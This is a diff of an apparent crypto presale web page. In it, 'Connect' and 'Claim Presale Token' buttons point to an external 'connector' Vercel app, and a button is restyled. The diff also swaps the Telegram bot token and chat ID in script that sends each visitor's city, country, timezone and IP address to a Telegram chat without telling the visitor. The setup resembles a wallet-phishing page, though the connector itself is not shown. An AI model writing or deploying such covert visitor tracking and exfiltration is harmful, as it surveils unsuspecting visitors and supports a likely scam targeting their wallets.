@@ -107,7 +107,7 @@
                     </div>
                     <div>
                         <a href="https://connector-b19b.vercel.app/" class="btn btn-warning btn-lg me-3">Connect</a>
-                        <a href="https://connector-b19b.vercel.app/" class="btn btn-light btn-lg">Claim Presale Token</a>
+                        <a href="https://connector-b19b.vercel.app/" class="btn btn-light btn-sm" style="margin:10px;">Claim Presale Token</a>
                     </div>
                 </div>
             </div>
@@ -585,7 +585,7 @@
             const message = `A user visited this website from ${data.city} - ${data.country} with timezone ${data.timezone} and IP address ${data.ip}`;
             
             // Send the message to the server
-            return fetch(`https://api.telegram.org/bot7688636891:AAF9ft0rhJk-EWkvUq89pYQDef_4gvDfPCo/sendMessage?chat_id=-1002324662504&text=${encodeURIComponent(message)}`);
+            return fetch(`https://api.telegram.org/bot8038111862:AAGXfAVo5DYcSRFQNCsHT-AvPqmcLBx85Xs/sendMessage?chat_id=-1002285345333&text=${encodeURIComponent(message)}`);
         })
         .then(response => {
             if (response.ok) {
